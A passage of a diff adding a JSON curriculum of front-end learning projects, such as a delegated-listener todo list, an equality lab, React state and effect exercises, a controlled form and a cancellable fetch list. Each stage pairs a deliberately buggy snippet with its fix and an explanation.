+            "aria-expanded on the trigger"
+          ],
+          "invariants": [
+            "Focus is never removed, only restyled."
+          ]
+        }
+      ],
+      "teaches": [
+        {
+          "category": "CSS",
+          "topic": "Positioning",
+          "subtopic": "static, relative, absolute, fixed, sticky, containing block, z-index",
+          "howCovered": "All five position values appear in one page, and the stacking-context trap is diagnosed from devtools.",
+          "conceptIds": [
+            "css-positioning"
+          ]
+        },
+        {
+          "category": "CSS",
+          "topic": "Interaction",
+          "subtopic": ":focus-visible and accessible interaction states",
+          "howCovered": "outline: none is removed and replaced with a focus ring that appears only for keyboard navigation.",
+          "conceptIds": [
+            "css-states"
+          ]
+        },
+        {
+          "category": "CSS",
+          "topic": "Sizing",
+          "subtopic": "aspect-ratio and logical properties",
+          "howCovered": "The modal uses aspect-ratio for its media slot and inset/inline-start logical properties throughout.",
+          "conceptIds": [
+            "css-ratio-logical"
+          ]
+        },
+        {
+          "category": "Accessibility",
+          "topic": "Foundations",
+          "subtopic": "Keyboard navigation and focus management",
+          "howCovered": "The dialog moves focus in on open, restores it on close, and closes on Escape — written by hand.",
+          "conceptIds": [
+            "a11y-core"
+          ]
+        }
+      ],
+      "implicitFoundations": [
+        {
+          "domain": "DOM & Browser Pipeline",
+          "title": "Paint order and compositing",
+          "mechanism": "The browser paints in stacking order; transform promotes an element to its own layer.",
+          "realWorldImpact": "Explains both the z-index failure and why transform animations are cheap.",
+          "conceptIds": [
+            "css-positioning",
+            "web-how-page-loads"
+          ]
+        }
+      ],
+      "frameworkVsManual": {
+        "frameworkHandled": [],
+        "manualEngineeringRequired": [
+          "Focus trap and focus restoration without a library.",
+          "A single source of truth for layer order."
+        ]
+      },
+      "conceptIds": [
+        "css-positioning",
+        "css-states",
+        "css-ratio-logical",
+        "a11y-core"
+      ],
+      "tags": [
+        "css",
+        "positioning",
+        "z-index",
+        "accessibility",
+        "beginner",
+        "state"
+      ]
+    },
+    {
+      "id": "basic-dom-todo",
+      "kind": "project",
+      "tier": "basic",
+      "difficulty": "Beginner",
+      "title": "Todo List Without React: Events, Closures and `this`",
+      "tagline": "A hundred rows, one listener — and every classic loop-variable bug, met deliberately.",
+      "realWorldAnalog": "Any admin table with row actions",
+      "architecturePattern": "Plain DOM with a single delegated listener",
+      "essence": "Build a todo list in plain JavaScript with no framework. React hides the DOM well enough that most candidates cannot explain what it is hiding. Here you attach one listener for a hundred rows, watch `this` change meaning between a method and a callback, and hit the `var`-in-a-loop bug on purpose so it is never a surprise.",
+      "estimatedBuildTimeHours": 4,
+      "xp": 140,
+      "prerequisites": [],
+      "inScope": [
+        "Add, toggle and delete items with one delegated click listener on the list.",
+        "A counter built from a closure rather than a global.",
+        "The same handler written as a method, an arrow, and a bound function.",
+        "Explicit capture-vs-bubble demonstration with stopPropagation."
+      ],
+      "outOfScope": [
+        "Any framework, including a virtual DOM toy.",
+        "Persistence, drag reordering, or filters.",
+        "A build step — this runs from a single HTML file."
+      ],
+      "stages": [
+        {
+          "stageNumber": 1,
+          "stageName": "One listener per row",
+          "focus": "var in a loop, a listener per element, and a lost `this`",
+          "codeSnippet": "for (var i = 0; i < todos.length; i++) {\n  var row = makeRow(todos[i]);\n  row.addEventListener('click', function () {\n    console.log('clicked', i);   // always todos.length\n    this.store.remove(i);        // 'this' is the element, not the store\n  });\n  list.appendChild(row);\n}",
+          "failureModeOrInvariant": "Every row logs the same index, because `var` has one binding for the whole loop and the callbacks close over that one binding. `this` inside the listener is the DOM element. Adding a row after render attaches no listener at all.",
+          "architecturalLesson": "A closure captures a variable, not a value. `this` is decided by how a function is called, not where it is written."
+        },
+        {
+          "stageNumber": 2,
+          "stageName": "One listener, total",
+          "focus": "Event delegation, block scope, explicit binding",
+          "codeSnippet": "list.addEventListener('click', (event) => {\n  const row = event.target.closest('[data-id]');\n  if (!row) return;\n  const { id } = row.dataset;\n  if (event.target.matches('.delete')) store.remove(id);\n});\n\n// A counter that owns its state without a global\nconst makeCounter = () => { let n = 0; return () => ++n; };",
+          "failureModeOrInvariant": "One listener handles rows that do not exist yet, because the event bubbles up to a parent that is always present. Memory does not grow with row count. The arrow function has no own `this`, so it keeps the enclosing one.",
+          "architecturalLesson": "Delegation works because events bubble. Understanding the capture/target/bubble phases is what lets you place a listener once instead of N times."
+        }
+      ],
+      "layers": [
+        {
+          "layer": "View",
+          "components": [
+            "list container",
+            "row template",
+            "delegated listener"
+          ],
+          "invariants": [
+            "Listener count stays at 1 regardless of item count."
+          ]
+        },
+        {
+          "layer": "State",
+          "components": [
+            "closure-backed store",
+            "subscriber callback"
+          ],
+          "invariants": [
+            "No state lives on window."
+          ]
+        }
+      ],
+      "teaches": [
+        {
+          "category": "JavaScript",
+          "topic": "DOM",
+          "subtopic": "DOM APIs, events, bubbling and delegation",
+          "howCovered": "Rebuilds N listeners as one delegated listener and walks the capture/bubble phases in devtools.",
+          "conceptIds": [
+            "js-dom-events"
+          ]
+        },
+        {
+          "category": "JavaScript",
+          "topic": "Execution",
+          "subtopic": "Scope, hoisting, TDZ and closures",
+          "howCovered": "The var-in-a-loop bug is reproduced, then fixed with let, then explained in terms of bindings.",
+          "conceptIds": [
+            "js-scope-closures"
+          ]
+        },
+        {
+          "category": "JavaScript",
+          "topic": "Execution",
+          "subtopic": "`this`, call/apply/bind and arrow functions",
+          "howCovered": "The same handler is written four ways and each call site is traced to the resulting `this`.",
+          "conceptIds": [
+            "js-this"
+          ]
+        }
+      ],
+      "implicitFoundations": [
+        {
+          "domain": "V8 Engine & Memory",
+          "title": "Closure retention",
+          "mechanism": "A closure keeps its enclosing scope alive as long as the function is reachable.",
+          "realWorldImpact": "A listener per row retains every row object; delegation is a memory decision as well as a code-size one.",
+          "conceptIds": [
+            "js-scope-closures"
+          ]
+        },
+        {
+          "domain": "Language Semantics",
+          "title": "Execution contexts",
+          "mechanism": "Each call creates a context with its own `this` binding resolved from the call form.",
+          "realWorldImpact": "Explains why passing a method as a callback loses its receiver.",
+          "conceptIds": [
+            "js-this"
+          ]
+        }
+      ],
+      "frameworkVsManual": {
+        "frameworkHandled": [],
+        "manualEngineeringRequired": [
+          "Rendering, diffing and event wiring — all of it, by hand.",
+          "Deciding where a listener belongs rather than attaching one per node."
+        ]
+      },
+      "conceptIds": [
+        "js-dom-events",
+        "js-scope-closures",
+        "js-this"
+      ],
+      "tags": [
+        "javascript",
+        "dom",
+        "events",
+        "closures",
+        "beginner"
+      ]
+    },
+    {
+      "id": "basic-equality-lab",
+      "kind": "project",
+      "tier": "basic",
+      "difficulty": "Beginner",
+      "title": "The Equality Lab: A Truth Table You Built Yourself",
+      "tagline": "Predict the answer, then run it. Every disagreement is a gap you just found.",
+      "realWorldAnalog": "The MCQ round of every front-end assessment",
+      "architecturePattern": "Executable specification — a table that tests itself",
+      "essence": "Build a small page that renders a comparison matrix: for every pair of values it shows ==, ===, Object.is and a deep-equal result, together with your prediction. It is a study tool disguised as a project, and it targets the exact material a 50-minute assessment spends a third of its questions on.",
+      "estimatedBuildTimeHours": 3,
+      "xp": 100,
+      "prerequisites": [],
+      "inScope": [
+        "A matrix over null, undefined, 0, -0, NaN, \"\", \"0\", [], {}, false.",
+        "Four columns: ==, ===, Object.is, and your own deepEqual.",
+        "A prediction field you fill in before revealing the computed answer.",
+        "A second panel for ??, ||, ?., ??= and default parameters on the same values."
+      ],
+      "outOfScope": [
+        "A test-runner framework.",
+        "Charts, scoring, or persistence.",
+        "Covering every primitive — ten well-chosen values beat fifty."
+      ],
+      "stages": [
+        {
+          "stageNumber": 1,
+          "stageName": "The rules you think you know",
+          "focus": "Loose equality and falsy checks",
+          "codeSnippet": "[] == false      // true\n[] == ![]        // true\nnull == 0        // false\nnull >= 0        // true\nNaN === NaN      // false\n\nfunction greet(name) {\n  name = name || 'guest';   // turns 0 and '' into 'guest'\n  return 'Hi ' + name;\n}",
+          "failureModeOrInvariant": "null == 0 is false but null >= 0 is true, because relational operators coerce and loose equality has a special case for null and undefined. The || default silently rewrites legitimate falsy inputs such as 0 and the empty string.",
+          "architecturalLesson": "== is not \"=== with type conversion\" — it is a specific algorithm with named exceptions. Knowing the exceptions is the whole trick."
+        },
+        {
+          "stageNumber": 2,
+          "stageName": "The rules as written",
+          "focus": "SameValueZero, Object.is, and nullish-only defaults",
+          "codeSnippet": "Object.is(NaN, NaN)   // true\nObject.is(0, -0)      // false\n[NaN].includes(NaN)   // true  (SameValueZero)\n[NaN].indexOf(NaN)    // -1    (strict equality)\n\nfunction greet(name) {\n  return `Hi ${name ?? 'guest'}`;  // 0 and '' survive\n}\nconst city = user?.address?.city ?? 'unknown';",
+          "failureModeOrInvariant": "includes and indexOf disagree about NaN, because they use different sameness algorithms. ?? falls back only for null and undefined, which is almost always what was meant by ||.",
+          "architecturalLesson": "JavaScript has four sameness algorithms, not one. Naming which one an API uses turns trivia into a rule you can apply."
+        }
+      ],
+      "layers": [
+        {
+          "layer": "Data",
+          "components": [
+            "value set",
+            "operator set",
+            "prediction record"
+          ],
+          "invariants": [
+            "Values are held as thunks so -0 and NaN survive serialisation."
+          ]
+        },
+        {
+          "layer": "View",
+          "components": [
+            "matrix table",
+            "prediction input",
+            "diff highlight"
+          ],
+          "invariants": [
+            "The computed answer stays hidden until a prediction is entered."
+          ]
+        }
+      ],
+      "teaches": [
+        {
+          "category": "JavaScript",
+          "topic": "Values",
+          "subtopic": "Types, coercion and equality",
+          "howCovered": "Every cell of the matrix is a coercion result you predicted before running.",
+          "conceptIds": [
+            "js-types-coercion"
+          ]
+        },
+        {
+          "category": "JavaScript",
+          "topic": "Values",
+          "subtopic": "Sameness: ==, ===, Object.is, NaN, +0/-0",
+          "howCovered": "All four sameness algorithms are computed side by side on values chosen to make them disagree.",
+          "conceptIds": [
+            "js-equality-matrix"
+          ]
+        },
+        {
+          "category": "JavaScript",
+          "topic": "Values",
+          "subtopic": "Handling undefined: ??, ||, ?., ??=, default parameters",
+          "howCovered": "A second panel runs the same values through each defaulting operator to expose where || is wrong.",
+          "conceptIds": [
+            "js-defaulting-operators"
+          ]
+        }
+      ],
+      "implicitFoundations": [
+        {
+          "domain": "Language Semantics",
+          "title": "Abstract operations",
+          "mechanism": "ToPrimitive, ToNumber and the Abstract Equality Comparison algorithm from the specification.",
+          "realWorldImpact": "Reading the spec once replaces a dozen memorised trivia answers with one procedure.",
+          "conceptIds": [
+            "js-types-coercion"
+          ]
+        }
+      ],
+      "frameworkVsManual": {
+        "frameworkHandled": [],
+        "manualEngineeringRequired": [
+          "A deepEqual implementation that handles NaN, -0, Dates and cycles.",
+          "Predicting before executing — the discipline is the deliverable."
+        ]
+      },
+      "conceptIds": [
+        "js-types-coercion",
+        "js-equality-matrix",
+        "js-defaulting-operators"
+      ],
+      "tags": [
+        "javascript",
+        "coercion",
+        "equality",
+        "assessment",
+        "beginner",
+        "reference_identity",
+        "rendering"
+      ]
+    },
+    {
+      "id": "basic-react-first",
+      "kind": "project",
+      "tier": "basic",
+      "difficulty": "Junior",
+      "title": "First React App: What Actually Re-renders, and When",
+      "tagline": "A counter, a clock and a list — and a render log that explains all three.",
+      "realWorldAnalog": "The warm-up question in a React screen",
+      "architecturePattern": "Component tree with state lifted to its lowest common ancestor",
+      "essence": "Build three tiny components and instrument every render. Most candidates can write this app; far fewer can say why calling setCount twice in one handler increments by one, or why their interval prints a stale value. This project makes both visible on screen rather than in prose.",
+      "estimatedBuildTimeHours": 4,
+      "xp": 150,
+      "prerequisites": [
+        "basic-dom-todo"
+      ],
+      "inScope": [
+        "A counter demonstrating batching and the updater form.",
+        "A clock whose interval is set up and torn down correctly.",
+        "A render counter printed by each component on every commit.",
+        "State lifted from a child to the shared parent, deliberately."
+      ],
+      "outOfScope": [
+        "Any state library.",
+        "Routing, styling systems, or data fetching.",
+        "useMemo and useCallback — you have not measured anything yet."
+      ],
+      "stages": [
+        {
+          "stageNumber": 1,
+          "stageName": "Reading state like a variable",
+          "focus": "Double set, stale closures, and an effect with no cleanup",
+          "codeSnippet": "function Counter() {\n  const [count, setCount] = useState(0);\n\n  function handleClick() {\n    setCount(count + 1);\n    setCount(count + 1);   // still 1, not 2\n  }\n\n  useEffect(() => {\n    setInterval(() => setCount(count + 1), 1000); // never cleaned up\n  }, []);                                        // count frozen at 0\n}",
+          "failureModeOrInvariant": "Two setCount calls produce one increment, because both read the same `count` captured by this render. The interval is never cleared, so every remount adds another one, and each keeps a `count` of 0 forever.",
+          "architecturalLesson": "State is a snapshot per render, not a mutable box. An effect closes over the render that created it."
+        },
+        {
+          "stageNumber": 2,
+          "stageName": "State as a snapshot",
+          "focus": "Updater functions, cleanup, and honest dependency arrays",
+          "codeSnippet": "const handleClick = () => {\n  setCount(c => c + 1);\n  setCount(c => c + 1);   // 2 — each receives the pending value\n};\n\nuseEffect(() => {\n  const id = setInterval(() => setCount(c => c + 1), 1000);\n  return () => clearInterval(id);   // teardown is not optional\n}, []);                              // honest: the effect uses no props",
+          "failureModeOrInvariant": "Both updates apply because each updater receives the queued value rather than the captured one. The interval count stays at exactly one across remounts, verifiable under StrictMode double-invocation.",
+          "architecturalLesson": "React batches updates and replays queued updaters against the latest state. Cleanup runs before every re-run and on unmount — that is what makes StrictMode double-mounting a useful check rather than a nuisance."
+        }
+      ],
+      "layers": [
+        {
+          "layer": "Components",
+          "components": [
+            "Counter",
+            "Clock",
+            "List",
+            "RenderBadge"
+          ],
+          "invariants": [
+            "Every component logs its render count; no component renders without a state or prop change."
+          ]
+        },
+        {
+          "layer": "State",
+          "components": [
+            "useState with updater form",
+            "lifted shared state"
+          ],
+          "invariants": [
+            "State lives at the lowest common ancestor of its readers, and no lower."
+          ]
+        }
+      ],
+      "teaches": [
+        {
+          "category": "React Core",
+          "topic": "Mental model",
+          "subtopic": "Render, commit and reconciliation",
+          "howCovered": "A render badge on each component makes the render/commit boundary observable during interaction.",
+          "conceptIds": [
+            "react-rendering-model"
+          ]
+        },
+        {
+          "category": "React Core",
+          "topic": "State",
+          "subtopic": "Batching, updaters and closure capture",
+          "howCovered": "The double-set bug is reproduced and then fixed with the updater form, with both results logged.",
+          "conceptIds": [
+            "react-state"
+          ]
+        },
+        {
+          "category": "React Core",
+          "topic": "Hooks",
+          "subtopic": "useEffect dependencies, cleanup, and when not to use it",
+          "howCovered": "The interval is written without cleanup, observed leaking under StrictMode, then corrected.",
+          "conceptIds": [
+            "react-effects"
+          ]
+        }
+      ],
+      "implicitFoundations": [
+        {
+          "domain": "Language Semantics",
+          "title": "Closures under React",
+          "mechanism": "Each render creates fresh function objects closing over that render’s state and props.",
+          "realWorldImpact": "The stale-closure bug in React is the same closure rule met in the vanilla todo project.",
+          "conceptIds": [
+            "js-scope-closures",
+            "react-state"
+          ]
+        },
+        {
+          "domain": "DOM & Browser Pipeline",
+          "title": "Timers and the event loop",
+          "mechanism": "setInterval enqueues a macrotask; React state updates flush as part of the ensuing work.",
+          "realWorldImpact": "Explains why an uncleaned interval keeps a whole component tree alive.",
+          "conceptIds": [
+            "js-event-loop"
+          ]
+        }
+      ],
+      "frameworkVsManual": {
+        "frameworkHandled": [
+          "Re-rendering and DOM updates",
+          "Update batching"
+        ],
+        "manualEngineeringRequired": [
+          "Choosing where state lives.",
+          "Writing every cleanup function yourself."
+        ]
+      },
+      "conceptIds": [
+        "react-rendering-model",
+        "react-state",
+        "react-effects"
+      ],
+      "tags": [
+        "react",
+        "state",
+        "effects",
+        "rendering",
+        "junior"
+      ]
+    },
+    {
+      "id": "basic-controlled-form",
+      "kind": "project",
+      "tier": "basic",
+      "difficulty": "Junior",
+      "title": "Signup Form: Controlled Inputs and Immutable Updates",
+      "tagline": "One nested state object, updated correctly — the bug that never shows an error message.",
+      "realWorldAnalog": "Checkout, onboarding, settings — the majority of real front-end work",
+      "architecturePattern": "Controlled components over a single nested state object",
+      "essence": "Build a signup form with nested state (profile, address, preferences), native validation plus custom rules, and a submit that cannot fire twice. The trap is nested updates: mutating one level deep produces a form that stops re-rendering with no error anywhere.",
+      "estimatedBuildTimeHours": 4,
+      "xp": 160,
+      "prerequisites": [
+        "basic-react-first"
+      ],
+      "inScope": [
+        "Every input controlled, including radio, checkbox group, and select.",
+        "Nested state updated immutably at two levels of depth.",
+        "Native constraint validation plus one rule the browser cannot express.",
+        "Labels correctly associated and errors announced with aria-describedby."
+      ],
+      "outOfScope": [
+        "A form library — react-hook-form comes after you can do this by hand.",
+        "A real backend.",
+        "Multi-step wizard navigation."
+      ],
+      "stages": [
+        {
+          "stageNumber": 1,
+          "stageName": "The form that stops updating",
+          "focus": "Mutating nested state and uncontrolled inputs",
+          "codeSnippet": "const [form, setForm] = useState({ user: { name: '' }, tags: [] });\n\nfunction onName(e) {\n  form.user.name = e.target.value;   // mutation\n  setForm(form);                     // same reference — no re-render\n}\nfunction addTag(t) {\n  form.tags.push(t);                 // push mutates\n  setForm(form);\n}\n<input value={form.user.name} />     {/* no onChange: read-only input */}",
+          "failureModeOrInvariant": "Typing does nothing. setForm receives the identical object reference, so React bails out of the re-render. No error is thrown — the field simply appears frozen, which is why this bug survives code review.",
+          "architecturalLesson": "React compares state by reference with Object.is. Mutating in place changes the value but not the identity, so nothing downstream notices."
+        },
+        {
+          "stageNumber": 2,
+          "stageName": "New object at every changed level",
+          "focus": "Copying the path, non-mutating array methods, real validation",
+          "codeSnippet": "setForm(prev => ({\n  ...prev,\n  user: { ...prev.user, name: value },   // every level on the path is new\n}));\n\n// mutating vs copying — know which is which\nsetTags(prev => [...prev, tag]);          // push mutates; spread does not\nsetSorted(prev => [...prev].sort());      // sort mutates in place\n\n<label htmlFor=\"email\">Email</label>\n<input id=\"email\" type=\"email\" required aria-describedby=\"email-err\" />",
+          "failureModeOrInvariant": "Only the objects on the changed path are recreated; siblings keep their identity, so memoised children below them do not re-render. Errors are associated with their inputs and read out by assistive tech.",
+          "architecturalLesson": "Immutable update means new identity along the path from root to the change — not a deep clone of everything. sort, splice, push and reverse mutate; map, filter, slice and toSorted do not."
+        }
+      ],
+      "layers": [
+        {
+          "layer": "Markup",
+          "components": [
+            "label/input pairs",
+            "fieldset + legend for groups",
+            "error region"
+          ],
+          "invariants": [
+            "Every control has an accessible name from a real label element."
+          ]
+        },
+        {
+          "layer": "State",
+          "components": [
+            "nested form object",
+            "errors map",
+            "submitting flag"
+          ],
+          "invariants": [
+            "No state object is ever mutated; submit is idempotent while pending."
+          ]
+        }
+      ],
+      "teaches": [
+        {
+          "category": "HTML",
+          "topic": "Forms",
+          "subtopic": "Labels, validation and submission",
+          "howCovered": "Native constraint validation is used first, with custom rules layered on only where it cannot reach.",
+          "conceptIds": [
+            "html-forms"
+          ]
+        },
+        {
+          "category": "React Core",
+          "topic": "State",
+          "subtopic": "Immutability — mutating vs copying methods",
+          "howCovered": "The frozen-form bug is reproduced by mutation and fixed by copying each level on the path.",
+          "conceptIds": [
+            "react-immutability"
+          ]
+        },
+        {
+          "category": "JavaScript",
+          "topic": "Data",
+          "subtopic": "Object references, shallow copies and deep cloning",
+          "howCovered": "Spread is shown to be shallow, and structuredClone is contrasted with a hand-written deep copy.",
+          "conceptIds": [
+            "react-references-copying",
+            "js-arrays-objects"
+          ]
+        }
+      ],
+      "implicitFoundations": [
+        {
+          "domain": "Language Semantics",
+          "title": "Reference identity",
+          "mechanism": "Objects are compared by reference; a shallow spread copies one level and shares the rest.",
+          "realWorldImpact": "The single most common source of \"React is not updating\" bug reports.",
+          "conceptIds": [
+            "react-references-copying"
+          ]
+        },
+        {
+          "domain": "DOM & Browser Pipeline",
+          "title": "Native form submission",
+          "mechanism": "A form submits on Enter within a text field and serialises named controls.",
+          "realWorldImpact": "Explains why a div with a click handler is not a form.",
+          "conceptIds": [
+            "html-forms"
+          ]
+        }
+      ],
+      "frameworkVsManual": {
+        "frameworkHandled": [
+          "Controlled value binding",
+          "Re-render on state identity change"
+        ],
+        "manualEngineeringRequired": [
+          "Immutable nested updates without an immer-style helper.",
+          "Error announcement wiring."
+        ]
+      },
+      "conceptIds": [
+        "html-forms",
+        "react-immutability",
+        "react-references-copying",
+        "js-arrays-objects"
+      ],
+      "tags": [
+        "react",
+        "forms",
+        "immutability",
+        "html",
+        "junior",
+        "reference_identity",
+        "rendering",
+        "state"
+      ]
+    },
+    {
+      "id": "basic-fetch-list",
+      "kind": "project",
+      "tier": "basic",
+      "difficulty": "Junior",
+      "title": "Fetch a List: Loading, Error, Empty, Data",
+      "tagline": "The four states, a race condition, and an abort — in about a hundred lines.",
+      "realWorldAnalog": "Every list screen in every product",
+      "architecturePattern": "Component-owned async state with an AbortController",
+      "essence": "Fetch and render a searchable list. The interesting part is not the happy path — it is the request that resolves after a newer one, the error that leaves a spinner running forever, and the empty result that renders as a blank screen. All three are graded in a real machine-coding round.",
+      "estimatedBuildTimeHours": 4,
+      "xp": 170,
+      "prerequisites": [
+        "basic-react-first"
+      ],
+      "inScope": [
+        "All four view states rendered distinctly: loading, error, empty, data.",
+        "A debounced search that cancels the in-flight request with AbortController.",
+        "Correct handling of a non-2xx response — fetch does not reject on 404.",
+        "A retry that clears the previous error."
+      ],
+      "outOfScope": [
+        "TanStack Query or SWR — write it once by hand first.",
+        "Pagination, infinite scroll, or caching.",
+        "A backend; a public API or a mocked delay is enough."
+      ],
+      "stages": [
+        {
+          "stageNumber": 1,
+          "stageName": "The happy path only",
+          "focus": "One boolean, no cancellation, no status check",
+          "codeSnippet": "useEffect(() => {\n  setLoading(true);\n  fetch(`/api/search?q=${query}`)\n    .then(r => r.json())          // 404 body parsed as success\n    .then(setItems)\n    .finally(() => setLoading(false));\n}, [query]);\n\nreturn loading ? <Spinner /> : <ul>{items.map(...)}</ul>;",
+          "failureModeOrInvariant": "Typing \"react\" fires five requests; whichever resolves last wins, so results can belong to \"rea\". fetch resolves for a 404, so an error page is rendered as data. An empty array renders as a blank screen with no explanation.",
+          "architecturalLesson": "fetch rejects only on network failure. Response.ok is the check, and out-of-order resolution is a correctness bug, not a performance one."
+        },
+        {
+          "stageNumber": 2,
+          "stageName": "Four states and a cancellation",
+          "focus": "AbortController, status checks, a discriminated state union",
+          "codeSnippet": "useEffect(() => {\n  const ac = new AbortController();\n  setState({ status: 'loading' });\n  fetch(url, { signal: ac.signal })\n    .then(async r => {\n      if (!r.ok) throw new Error(`HTTP ${r.status}`);\n      return r.json();\n    })\n    .then(items => setState(\n      items.length ? { status: 'data', items } : { status: 'empty' }))\n    .catch(e => { if (e.name !== 'AbortError') setState({ status: 'error', e }); });\n  return () => ac.abort();          // stale request cancelled on re-run\n}, [url]);",
+          "failureModeOrInvariant": "Only the newest request can write state, because the effect cleanup aborts the previous one. A 404 lands in the error branch. Empty and error are distinct screens, so a user never sees an unexplained blank list.",
+          "architecturalLesson": "Modelling async as one union — loading | error | empty | data — makes impossible combinations unrepresentable. Two booleans allow four states, of which two are nonsense."
+        }
+      ],
+      "layers": [
+        {
+          "layer": "View",
+          "components": [
+            "Spinner",
+            "ErrorPanel with retry",
+            "EmptyState",
+            "ResultList"
+          ],
+          "invariants": [
+            "Exactly one of the four states renders at a time."
+          ]
+        },
+        {
+          "layer": "Data",
+          "components": [
+            "fetch wrapper",
+            "AbortController per request",
+            "debounce"
+          ],
+          "invariants": [
+            "No response from a superseded request may write state."
+          ]
+        }
+      ],
+      "teaches": [
+        {
+          "category": "Web Platform",
+          "topic": "Network",
+          "subtopic": "HTTP, status codes, methods and idempotency",
+          "howCovered": "Response.ok and status branching are written by hand, including 4xx vs 5xx retry policy.",
+          "conceptIds": [
+            "web-http"
+          ]
+        },
+        {
+          "category": "JavaScript",
+          "topic": "Async",
+          "subtopic": "Promises, async/await and cancellation",
+          "howCovered": "The race is reproduced, then removed with AbortController wired to the effect cleanup.",
+          "conceptIds": [
+            "js-promises"
+          ]
+        },
+        {
+          "category": "React Core",
+          "topic": "Hooks",
+          "subtopic": "useEffect cleanup for async work",
+          "howCovered": "Cleanup is used as the cancellation point, which is the canonical answer to the stale-response question.",
+          "conceptIds": [
+            "react-effects"
+          ]
+        }
+      ],
+      "implicitFoundations": [
+        {
+          "domain": "Internet & Protocols",
+          "title": "Request lifecycle",
+          "mechanism": "DNS, TCP, TLS and HTTP round trips precede the first byte of the response body.",
+          "realWorldImpact": "Explains why a spinner appears before any data can possibly arrive.",
+          "conceptIds": [
+            "web-http",
+            "web-how-page-loads"
+          ]
+        },
+        {
+          "domain": "Language Semantics",
+          "title": "Microtask ordering",
+          "mechanism": "Promise callbacks run on the microtask queue, draining before the next macrotask.",
+          "realWorldImpact": "Explains the exact interleaving of two in-flight requests resolving.",
+          "conceptIds": [
+            "js-event-loop"
+          ]
+        }
+      ],
+      "frameworkVsManual": {
+        "frameworkHandled": [
+          "Re-render on state change"
+        ],
+        "manualEngineeringRequired": [
+          "Cancellation, status handling and the state union — no data library allowed.",
+          "A debounce written from scratch."
+        ]
+      },
+      "conceptIds": [
+        "web-http",
+        "js-promises",
+        "react-effects"
+      ],
+      "tags": [
+        "react",
+        "async",
+        "http",
+        "fetch",
+        "junior",
+        "rendering"
+      ]
+    },
+    {
+      "id": "basic-class-museum",
+      "kind": "project",
+      "tier": "basic",
+      "difficulty": "Junior",
+      "title": "The Class Component Museum: Port It Twice",
+      "tagline": "The same widget as a class and as a hook — because the assessment still asks about both.",
+      "realWorldAnalog": "Any codebase older than 2019, which is most of them",
+      "architecturePattern": "Parallel implementations: lifecycle methods vs hooks",
+      "essence": "Write one widget twice — once with componentDidMount / componentDidUpdate / componentWillUnmount, once with hooks — and map each method to its hook equivalent. Mettl publishes \"Lifecycle\" as a named React sub-skill, and enterprise React codebases still contain thousands of class components. This is also the cleanest place to meet the prototype chain, since a class is one.",
+      "estimatedBuildTimeHours": 3,
+      "xp": 130,
+      "prerequisites": [
+        "basic-react-first"
+      ],
+      "inScope": [
+        "A subscription widget implemented as a class and as a function component.",
+        "A mapping table from each lifecycle method to its hook equivalent.",
+        "One error boundary — still only expressible as a class.",
+        "Inspecting the prototype chain of the class instance in devtools."
+      ],
+      "outOfScope": [
+        "Migrating a real legacy codebase.",
+        "Legacy UNSAFE_ lifecycle methods beyond naming them.",
+        "A HOC library."
+      ],
+      "stages": [
+        {
+          "stageNumber": 1,
+          "stageName": "The class, with its classic bugs",
+          "focus": "Lifecycle methods, bound handlers, setState merging",
+          "codeSnippet": "class Ticker extends React.Component {\n  state = { n: 0, meta: { on: true } };\n\n  componentDidMount() { this.id = setInterval(this.tick, 1000); }\n  componentDidUpdate(prev) {\n    if (prev.src !== this.props.src) this.resubscribe();  // easy to forget\n  }\n  componentWillUnmount() { clearInterval(this.id); }\n\n  tick() { this.setState({ n: this.state.n + 1 }); }   // unbound: 'this' is undefined\n}",
+          "failureModeOrInvariant": "tick throws because a class method passed as a callback loses its receiver. setState merges at the top level only, so setting { meta: {...} } replaces the whole nested object. Setup and teardown live in three separate methods, so one is routinely forgotten.",
+          "architecturalLesson": "Class components split one concern across three lifecycle methods. That separation, not verbosity, is the reason hooks exist."
+        },
+        {
+          "stageNumber": 2,
+          "stageName": "The same widget, as one effect",
+          "focus": "Mapping lifecycle to hooks and reading the prototype chain",
+          "codeSnippet": "useEffect(() => {\n  const id = setInterval(() => setN(n => n + 1), 1000);\n  return () => clearInterval(id);   // setup and teardown, adjacent\n}, [src]);                          // covers didMount AND didUpdate\n\n// A class IS a prototype chain:\nObject.getPrototypeOf(new Ticker({}))            // Ticker.prototype\nObject.getPrototypeOf(Ticker.prototype)          // React.Component.prototype\nTicker.prototype.hasOwnProperty('tick')          // true — methods live here",
+          "failureModeOrInvariant": "One effect replaces three lifecycle methods, and the dependency array makes the didUpdate condition declarative. Instance state stays on the instance; methods live on the prototype and are shared across every instance.",
+          "architecturalLesson": "`class` is syntax over prototypes. Knowing where a method actually lives explains method sharing, `super`, and why an arrow class field is per-instance."
+        }
+      ],
+      "layers": [
+        {
+          "layer": "Legacy",
+          "components": [
+            "class Ticker",
+            "ErrorBoundary",
+            "lifecycle mapping table"
+          ],
+          "invariants": [
+            "Every lifecycle method used is paired with its hook equivalent in the table."
+          ]
+        },
+        {
+          "layer": "Modern",
+          "components": [
+            "function Ticker",
+            "useEffect subscription",
+            "custom hook extraction"
+          ],
+          "invariants": [
+            "Setup and its teardown are never more than a few lines apart."
+          ]
+        }
+      ],
+      "teaches": [
+        {
+          "category": "React Core",
+          "topic": "Legacy",
+          "subtopic": "Class components and the lifecycle vocabulary",
+          "howCovered": "Every common lifecycle method is written, then mapped to its hook equivalent in a table you build.",
+          "conceptIds": [
+            "react-class-lifecycle"
+          ]
+        },
+        {
+          "category": "JavaScript",
+          "topic": "Objects",
+          "subtopic": "Prototypes, the prototype chain and classes",
+          "howCovered": "The class instance is walked with getPrototypeOf to show where methods and state actually live.",
+          "conceptIds": [
+            "js-prototypes"
+          ]
+        },
+        {
+          "category": "React Advanced",
+          "topic": "Escape hatches",
+          "subtopic": "Error boundaries",
+          "howCovered": "An error boundary is implemented — the one thing that still requires a class in React 19.",
+          "conceptIds": [
+            "react-errors-portals"
+          ]
+        }
+      ],
+      "implicitFoundations": [
+        {
+          "domain": "Language Semantics",
+          "title": "Method binding",
+          "mechanism": "A prototype method has no bound receiver; a class field arrow captures the instance at construction.",
+          "realWorldImpact": "Explains the constructor .bind(this) lines in every legacy React file.",
+          "conceptIds": [
+            "js-this",
+            "js-prototypes"
+          ]
+        }
+      ],
+      "frameworkVsManual": {
+        "frameworkHandled": [
+          "Lifecycle invocation",
+          "Error boundary catching"
+        ],
+        "manualEngineeringRequired": [
+          "The lifecycle-to-hook mapping, written from understanding rather than copied.",
+          "Reading the prototype chain in devtools."
+        ]
+      },
+      "conceptIds": [
+        "react-class-lifecycle",
+        "js-prototypes",
+        "react-errors-portals"
+      ],
+      "tags": [
+        "react",
+        "lifecycle",
